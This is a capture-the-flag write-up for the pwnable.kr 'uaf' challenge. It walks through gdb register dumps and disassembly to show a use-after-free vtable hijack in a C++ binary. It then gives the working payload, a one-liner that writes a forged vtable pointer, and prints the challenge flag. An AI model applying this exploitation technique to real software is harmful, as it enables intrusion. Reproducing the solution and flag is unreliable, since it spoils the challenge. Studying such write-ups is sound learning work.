# uaf

1. Login into server with passwd: `guest`:
```
$ ssh uaf@pwnable.kr -p2222
$ scp -P2222 uaf@pwnable.kr:~/* .
```

2. The idea of the task is to call `give_shell()` method of `Human` class.


3. How I called the `give_shell()` method:

* `break *main+79`
* `next`

Now in `rbx` I got the address of of the new `Man` class object.
```
$rax   : 0x0000000000614ea0  →  0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp
$rbx   : 0x0000000000614ea0  →  0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp
$rcx   : 0x0
$rdx   : 0x19
$rsp   : 0x00007fffffffddd0  →  0x00007fffffffdf18  →  0x00007fffffffe2a1  →  "/home/luk6xff/Projects/ctf/pwnable.kr/uaf/uaf"
$rbp   : 0x00007fffffffde30  →  0x00000000004013b0  →  <__libc_csu_init+0> mov QWORD PTR [rsp-0x28], rbp
$rsi   : 0x00007fffffffdde0  →  0x0000000000614e88  →  0x000000006b63614a ("Jack"?)
$rdi   : 0x00007ffff7dd3d80  →  0x0000000000000000
$rip   : 0x0000000000400f18  →  <main+84> mov QWORD PTR [rbp-0x38], rbx
$r8    : 0x00007ffff782fd80  →  0x0000000000000000
$r9    : 0x0
$r10   : 0x6
$r11   : 0x00007ffff7b21210  →  <std::string::assign(std::string+0> push rbx
$r12   : 0x00007fffffffdde0  →  0x0000000000614e88  →  0x000000006b63614a ("Jack"?)
$r13   : 0x00007fffffffdf10  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffddd0│+0x0000: 0x00007fffffffdf18  →  0x00007fffffffe2a1  →  "/home/luk6xff/Projects/ctf/pwnable.kr/uaf/uaf"        ← $rsp
0x00007fffffffddd8│+0x0008: 0x000000010000ffff
0x00007fffffffdde0│+0x0010: 0x0000000000614e88  →  0x000000006b63614a ("Jack"?)  ← $rsi, $r12
0x00007fffffffdde8│+0x0018: 0x0000000000401177  →  <_GLOBAL__sub_I_main+19> pop rbp
0x00007fffffffddf0│+0x0020: 0x0000000000000001
0x00007fffffffddf8│+0x0028: 0x000000000040140d  →  <__libc_csu_init+93> add rbx, 0x1
0x00007fffffffde00│+0x0030: 0x00007ffff7de59a0  →  <_dl_fini+0> push rbp
0x00007fffffffde08│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400f0c <main+72>        add    BYTE PTR [rcx+rcx*4-0x1a], cl
     0x400f10 <main+76>        mov    rdi, rbx
     0x400f13 <main+79>        call   0x401264 <_ZN3ManC2ESsi>
 →   0x400f18 <main+84>        mov    QWORD PTR [rbp-0x38], rbx
```

`$rbx   : 0x0000000000614ea0  →  0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp`
It's clearly visible that `this` pointer is located at `0x0000000000614ea0`

Now let's take a look on the line 60: `m->introduce();`
Set the breakpoint at: `b *main+265`.

As we know C++ virtual functions calling convention it looks like this: `this->vptr->introduce` where where `give_shell()` is at offset 0 and `introduce()` is at offset 8.

`0x0000000000401570` - is an address of `vtable` pointing by `vptr` to.
Looking at disassembly how `introduce()` is called:
```0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:   add    rax,0x8
=> 0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:   mov    rdi,rax
   0x0000000000400fe2 <+286>:   call   rdx

```
Now when we know that `give_shell()` is at `vptr + 0 `(0x0000000000401570) and `introduce()` is at `vptr + 8 `(0x0000000000401578) we have to prepare an attack.

### Exploit

The goal of the exploit is to allocate some mory to simulate a `Man` object in the same memory chunk which freed before  but with the `vptr` modified in order to call the `give_shell` function instead of `introduce` when we do the use option.
If `0x401570` was the vtable’s address and we call `introduce()` which is at `0x401578` it means that the call we do is at offset `0x401578-0x401570 = 8`. Now we can subtract the offset from the vtable’s address to obtain the modified pointer.
We have to go through the steps: 1, 3, and two times 2 using the following payload:


```
python3 -c 'print("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/uaf_data
./uaf 24 /tmp/uaf_data
```
where:
* `24` - is a memory chunk allocated by `new`:
```
   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:    mov    edi,0x18  <==== 24
   0x0000000000400f00 <+60>:    call   0x400d90 <_Znwm@plt>
```
* `"\x68\x15\x40\x00\x00\x00\x00\x00"` - is and `vtable` address of the `give_shell()` function decreased by 8 (`introduce()` is called by adding 8 bytes offset to `vptr`: `0x0000000000400fd4 <+272>:   add    rax,0x8`).


And we get the shell:
`cat flag` gives us:

```
FLAG: {yay_f1ag_aft3r_pwning}
```